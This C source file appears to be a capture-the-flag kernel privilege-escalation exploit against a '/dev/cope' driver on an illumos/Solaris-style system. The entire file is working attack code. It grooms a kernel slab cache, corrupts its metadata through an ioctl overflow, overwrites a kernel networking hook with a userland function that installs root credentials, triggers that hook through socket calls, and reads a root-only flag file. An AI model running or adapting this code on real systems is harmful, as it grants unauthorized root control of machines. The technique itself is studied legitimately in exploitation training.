#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <kstat.h>
#include <nlist.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <netinet/in.h>
#include <sys/processor.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define COPEIOC        (('c' << 24) | ('o' << 16) | ('p' << 8) | 'e')
#define COPEIOC_COPE   (COPEIOC | 1)

#define T_PROCP_OFF    0x190u
#define T_CRED_OFF     0x1c8u
#define T_INTR_OFF     0x108u
#define P_CRED_OFF     0x20u

#define CHUNKS_16      251ULL
#define OVERFLOW_NCOPE 0x40000000u

typedef struct cope {
    uint8_t co_data[8];
    uint32_t co_id;
} __attribute__((packed)) cope_t;

typedef struct cope_ioc {
    cope_t *ci_copes;
    uint32_t ci_ncope;
} cope_ioc_t;

typedef struct child_cmd {
    uint32_t op;
    uint32_t accessible;
    uint32_t ncope;
    uint32_t reserved;
    uint8_t data[128];
} child_cmd_t;

typedef struct child_rsp {
    int32_t rc;
    int32_t err;
} child_rsp_t;

typedef struct child {
    pid_t pid;
    int to_child;
    int from_child;
    bool opened;
} child_t;

enum {
    OP_OPEN = 1,
    OP_IOCTL = 2,
    OP_EXIT = 3,
    OP_FREEZE = 4,
};

static uintptr_t g_kcred_sym;
static uintptr_t g_target_hook;
static const char *g_target_name;

static inline void *
curthread_ptr(void)
{
    void *thr;
    __asm__ volatile("movq %%gs:0x18,%0" : "=r"(thr));
    return thr;
}

__attribute__((noinline))
static int64_t
rootme(long a0, long a1, long a2, long a3, long a4, long a5, long a6, long a7)
{
    (void)a0;
    (void)a1;
    (void)a2;
    (void)a3;
    (void)a4;
    (void)a5;
    (void)a6;
    (void)a7;

    char *thr = curthread_ptr();
    char *owner = *(char **)(thr + T_INTR_OFF);
    char *proc;
    void *cred = *(void **)g_kcred_sym;

    if (owner == NULL) {
        owner = thr;
    }
    proc = *(char **)(owner + T_PROCP_OFF);

    *(void **)(owner + T_CRED_OFF) = cred;
    *(void **)(proc + P_CRED_OFF) = cred;
    *(void **)g_target_hook = NULL;

    __asm__ volatile("" ::: "memory");
    return 0;
}

static void
die(const char *msg)
{
    perror(msg);
    exit(1);
}

static void
diex(const char *msg)
{
    fprintf(stderr, "%s\n", msg);
    exit(1);
}

static void
write_full(int fd, const void *buf, size_t len)
{
    const uint8_t *p = buf;
    while (len != 0) {
        ssize_t n = write(fd, p, len);
        if (n < 0) {
            if (errno == EINTR) {
                continue;
            }
            die("write");
        }
        p += (size_t)n;
        len -= (size_t)n;
    }
}

static void
read_full(int fd, void *buf, size_t len)
{
    uint8_t *p = buf;
    while (len != 0) {
        ssize_t n = read(fd, p, len);
        if (n == 0) {
            diex("unexpected EOF");
        }
        if (n < 0) {
            if (errno == EINTR) {
                continue;
            }
            die("read");
        }
        p += (size_t)n;
        len -= (size_t)n;
    }
}

static void
set_fd_limit(void)
{
    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) != 0) {
        die("getrlimit");
    }
    if (rl.rlim_cur < 4096) {
        rl.rlim_cur = rl.rlim_max < 4096 ? rl.rlim_max : 4096;
        if (setrlimit(RLIMIT_NOFILE, &rl) != 0) {
            die("setrlimit");
        }
    }
}

static void
bind_cpu0(void)
{
    processorid_t oldcpu;
    if (processor_bind(P_PID, P_MYID, 0, &oldcpu) != 0) {
        die("processor_bind");
    }
}

static void
child_loop(int rfd, int wfd)
{
    int fd = -1;
    const long pagesz = sysconf(_SC_PAGESIZE);

    bind_cpu0();

    for (;;) {
        child_cmd_t cmd;
        child_rsp_t rsp;
        memset(&cmd, 0, sizeof(cmd));
        memset(&rsp, 0, sizeof(rsp));

        read_full(rfd, &cmd, sizeof(cmd));

        if (cmd.op == OP_OPEN) {
            errno = 0;
            fd = open("/dev/cope", O_RDWR);
            rsp.rc = fd >= 0 ? 0 : -1;
            rsp.err = fd >= 0 ? 0 : errno;
            write_full(wfd, &rsp, sizeof(rsp));
            continue;
        }

        if (cmd.op == OP_IOCTL) {
            uint8_t *map = mmap(NULL, (size_t)pagesz * 2, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANON, -1, 0);
            if (map == MAP_FAILED) {
                die("mmap");
            }
            if (mprotect(map + pagesz, (size_t)pagesz, PROT_NONE) != 0) {
                die("mprotect");
            }

            if (cmd.accessible > sizeof(cmd.data) || cmd.accessible > (uint32_t)pagesz) {
                diex("bad accessible size");
            }

            uint8_t *ptr = map + pagesz - cmd.accessible;
            memcpy(ptr, cmd.data, cmd.accessible);

            cope_ioc_t ioc = {
                .ci_copes = (cope_t *)ptr,
                .ci_ncope = cmd.ncope,
            };

            errno = 0;
            rsp.rc = ioctl(fd, COPEIOC_COPE, &ioc);
            rsp.err = errno;
            write_full(wfd, &rsp, sizeof(rsp));

            munmap(map, (size_t)pagesz * 2);
            continue;
        }

        if (cmd.op == OP_EXIT) {
            _exit(0);
        }

        if (cmd.op == OP_FREEZE) {
            for (;;)
                pause();
        }

        diex("unknown child op");
    }
}

static child_t
spawn_child(void)
{
    int p2c[2];
    int c2p[2];
    child_t child;

    if (pipe(p2c) != 0) {
        die("pipe");
    }
    if (pipe(c2p) != 0) {
        die("pipe");
    }

    child.pid = fork();
    if (child.pid < 0) {
        die("fork");
    }
    if (child.pid == 0) {
        close(p2c[1]);
        close(c2p[0]);
        child_loop(p2c[0], c2p[1]);
        _exit(0);
    }

    close(p2c[0]);
    close(c2p[1]);
    child.to_child = p2c[1];
    child.from_child = c2p[0];
    child.opened = false;
    return child;
}

static child_rsp_t
child_do(child_t *child, const child_cmd_t *cmd)
{
    child_rsp_t rsp;
    write_full(child->to_child, cmd, sizeof(*cmd));
    read_full(child->from_child, &rsp, sizeof(rsp));
    return rsp;
}

static void
child_open_cope(child_t *child)
{
    child_cmd_t cmd;
    child_rsp_t rsp;

    memset(&cmd, 0, sizeof(cmd));
    cmd.op = OP_OPEN;
    rsp = child_do(child, &cmd);
    if (rsp.rc != 0) {
        errno = rsp.err;
        die("child open /dev/cope");
    }
    child->opened = true;
}

static void
child_do_ioctl(child_t *child, const void *data, size_t accessible)
{
    child_cmd_t cmd;
    child_rsp_t rsp;

    memset(&cmd, 0, sizeof(cmd));
    cmd.op = OP_IOCTL;
    cmd.accessible = (uint32_t)accessible;
    cmd.ncope = OVERFLOW_NCOPE;
    memcpy(cmd.data, data, accessible);
    rsp = child_do(child, &cmd);
    if (!(rsp.rc == -1 && rsp.err == EFAULT)) {
        fprintf(stderr, "unexpected ioctl result rc=%d err=%d\n", rsp.rc, rsp.err);
        exit(1);
    }
}

static uintptr_t
resolve_symbol(const char *name)
{
    struct nlist nl[2];
    memset(nl, 0, sizeof(nl));
    nl[0].n_name = (char *)name;
    if (nlist("/dev/ksyms", nl) != 0 || nl[0].n_value == 0) {
        fprintf(stderr, "failed to resolve %s\n", name);
        exit(1);
    }
    return (uintptr_t)nl[0].n_value;
}

static uintptr_t
resolve_target(const char *spec)
{
    char *end;
    unsigned long long v;

    if (spec[0] == '0' && spec[1] == 'x') {
        errno = 0;
        v = strtoull(spec, &end, 0);
        if (errno != 0 || *end != '\0') {
            fprintf(stderr, "bad target address: %s\n", spec);
            exit(1);
        }
        return (uintptr_t)v;
    }

    return resolve_symbol(spec);
}

static kstat_t *
lookup_kstat(kstat_ctl_t *kc, const char *name)
{
    kstat_t *ksp = kstat_lookup(kc, "unix", 0, (char *)name);
    if (ksp == NULL) {
        fprintf(stderr, "kstat_lookup(%s) failed\n", name);
        exit(1);
    }
    return ksp;
}

static uint64_t
kstat_named_u64(kstat_ctl_t *kc, kstat_t *ksp, const char *name)
{
    kstat_named_t *knp;

    if (kstat_read(kc, ksp, NULL) == -1) {
        die("kstat_read");
    }
    knp = kstat_data_lookup(ksp, (char *)name);
    if (knp == NULL) {
        fprintf(stderr, "missing kstat field %s\n", name);
        exit(1);
    }

    switch (knp->data_type) {
    case KSTAT_DATA_UINT64:
        return knp->value.ui64;
    case KSTAT_DATA_UINT32:
        return knp->value.ui32;
    case KSTAT_DATA_LONG:
        return (uint64_t)knp->value.l;
    default:
        fprintf(stderr, "unsupported kstat type %u for %s\n", knp->data_type, name);
        exit(1);
    }
}

static uintptr_t
kmem_alloc_16_cache(kstat_ctl_t *kc)
{
    kstat_t *ksp = lookup_kstat(kc, "kmem_alloc_16");
    return (uintptr_t)ksp->ks_private;
}

static void
put64(uint8_t *p, uint64_t v)
{
    memcpy(p, &v, sizeof(v));
}

static void
put32(uint8_t *p, uint32_t v)
{
    memcpy(p, &v, sizeof(v));
}

static void
put16(uint8_t *p, uint16_t v)
{
    memcpy(p, &v, sizeof(v));
}

static void
read_flag(void)
{
    char buf[256];
    ssize_t n;
    int fd = open("/root/flag.txt", O_RDONLY);
    if (fd < 0) {
        die("open flag");
    }
    n = read(fd, buf, sizeof(buf) - 1);
    if (n < 0) {
        die("read flag");
    }
    buf[n] = '\0';
    printf("%s\n", buf);
    fflush(stdout);
}

static void
trigger_sctp_unlisten(void)
{
    int fd;
    struct sockaddr_in sa;

    fd = socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP);
    if (fd < 0) {
        die("socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP)");
    }

    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = 0;
    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

    if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
        die("bind SCTP");
    }
    if (listen(fd, 1) != 0) {
        die("listen SCTP");
    }
    if (close(fd) != 0) {
        die("close SCTP");
    }
}

static void
trigger_tcp_unlisten(void)
{
    int fd;
    struct sockaddr_in sa;

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        die("socket(AF_INET, SOCK_STREAM, 0)");
    }

    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = 0;
    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

    if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
        die("bind TCP");
    }
    if (listen(fd, 1) != 0) {
        die("listen TCP");
    }
    if (close(fd) != 0) {
        die("close TCP");
    }
}

static void
trigger_ipv4_send(void)
{
    int fd;
    struct sockaddr_in sa;
    static const char byte = 'A';

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        die("socket(AF_INET, SOCK_DGRAM, 0)");
    }

    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(9);
    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

    if (sendto(fd, &byte, sizeof(byte), 0, (struct sockaddr *)&sa,
        sizeof(sa)) < 0) {
        die("sendto UDP");
    }
    if (close(fd) != 0) {
        die("close UDP");
    }
}

static void
sigtrap_handler(int sig)
{
    (void)sig;
}

static void
trigger_breakpoint(void)
{
    struct sigaction sa;

    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sigtrap_handler;
    sigemptyset(&sa.sa_mask);
    if (sigaction(SIGTRAP, &sa, NULL) != 0) {
        die("sigaction(SIGTRAP)");
    }

    __asm__ volatile("int3");
}

static void
trigger_all(void)
{
    for (unsigned i = 0; i < 256 && geteuid() != 0; i++) {
        trigger_sctp_unlisten();
        if (geteuid() == 0) {
            break;
        }
        trigger_tcp_unlisten();
        if (geteuid() == 0) {
            break;
        }
        trigger_ipv4_send();
        if (strcmp(g_target_name, "kdi_kernel_handler") == 0) {
            trigger_breakpoint();
        }
        usleep(1000);
    }
}

int
main(int argc, char **argv)
{
    kstat_ctl_t *kc;
    kstat_t *k16;
    child_t attacker;
    child_t child_b;
    child_t child_c;
    bool have_attacker = false;
    size_t attacker_idx = (size_t)-1;
    size_t opened = 0;
    uint64_t slab_create_before, slab_create_after;
    uintptr_t cache16;
    uintptr_t fake_buf;
    uintptr_t fake_bcp;
    uintptr_t target_buf;
    uintptr_t target_bcp;
    uint8_t meta_payload[84];
    uint8_t patch_payload[8];
    const char *target_name;
    bool zero_only = false;
    long target_delta = 0;
    char *end;

    setvbuf(stdout, NULL, _IONBF, 0);
    set_fd_limit();
    bind_cpu0();

    target_name = argc > 1 ? argv[1] : "cl_sctp_unlisten";
    if (argc > 2) {
        errno = 0;
        target_delta = strtol(argv[2], &end, 0);
        if (errno != 0 || *end != '\0') {
            fprintf(stderr, "bad target delta: %s\n", argv[2]);
            exit(1);
        }
    }
    if (argc > 3 && strcmp(argv[3], "zero") == 0) {
        zero_only = true;
    }
    g_target_name = target_name;
    g_kcred_sym = resolve_symbol("kcred");
    g_target_hook = resolve_target(target_name) + target_delta;

    kc = kstat_open();
    if (kc == NULL) {
        die("kstat_open");
    }
    k16 = lookup_kstat(kc, "kmem_alloc_16");
    cache16 = kmem_alloc_16_cache(kc);

    {
        void *fake_page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_PRIVATE | MAP_ANON, -1, 0);
        if (fake_page == MAP_FAILED) {
            die("mmap fake");
        }
        fake_buf = (uintptr_t)fake_page + 0x100;
    }

    target_buf = g_target_hook - 12;
    target_bcp = target_buf + 8;
    fake_bcp = fake_buf + 8;
    *(uintptr_t *)fake_bcp = target_bcp;

    memset(meta_payload, 0, sizeof(meta_payload));
    put64(meta_payload + 12 + 0, cache16);
    put64(meta_payload + 12 + 8, 0);
    put64(meta_payload + 12 + 16, 0);
    put64(meta_payload + 12 + 24, 0);
    put64(meta_payload + 12 + 32, 1);
    put64(meta_payload + 12 + 40, fake_bcp);
    put64(meta_payload + 12 + 48, 1);
    put64(meta_payload + 12 + 56, CHUNKS_16);
    put32(meta_payload + 12 + 64, 0xffffffffu);
    put16(meta_payload + 12 + 68, 0);
    put16(meta_payload + 12 + 70, 0);

    if (zero_only) {
        memset(patch_payload, 0, sizeof(patch_payload));
    } else {
        put64(patch_payload, (uintptr_t)&rootme);
    }

    slab_create_before = kstat_named_u64(kc, k16, "slab_create");

    for (size_t i = 0; i < 1024; i++) {
        child_t cur = spawn_child();
        child_open_cope(&cur);
        opened++;
        slab_create_after = kstat_named_u64(kc, k16, "slab_create");
        if ((opened % 32) == 0) {
            fprintf(stderr, "[*] opened %zu holders slab_create=%llu\n",
                opened, (unsigned long long)slab_create_after);
        }
        if (slab_create_after == slab_create_before + 1) {
            attacker_idx = i;
            attacker = cur;
            have_attacker = true;
            break;
        }
        {
            child_cmd_t freeze;
            memset(&freeze, 0, sizeof(freeze));
            freeze.op = OP_FREEZE;
            write_full(cur.to_child, &freeze, sizeof(freeze));
            close(cur.to_child);
            close(cur.from_child);
        }
        slab_create_before = slab_create_after;
    }

    if (!have_attacker) {
        diex("failed to find fresh slab");
    }

    child_b = spawn_child();
    child_c = spawn_child();

    fprintf(stderr,
        "[*] %s=%#lx kcred_sym=%#lx cache16=%#lx attacker=%zu\n",
        g_target_name, (unsigned long)g_target_hook, (unsigned long)g_kcred_sym,
        (unsigned long)cache16, attacker_idx);

    child_do_ioctl(&attacker, meta_payload, sizeof(meta_payload));
    fprintf(stderr, "[*] corrupted fresh slab metadata\n");
    child_open_cope(&child_b);
    fprintf(stderr, "[*] opener B consumed fake user buffer\n");
    child_open_cope(&child_c);
    fprintf(stderr, "[*] opener C reached target buffer candidate\n");
    child_do_ioctl(&child_c, patch_payload, sizeof(patch_payload));
    fprintf(stderr, "[*] patched %s%s\n", g_target_name,
        zero_only ? " (zero-only)" : "");

    if (zero_only) {
        return (0);
    }

    trigger_all();

    if (geteuid() != 0) {
        diex("exploit failed");
    }

    read_flag();

    for (;;)
        pause();

    return 0;
}
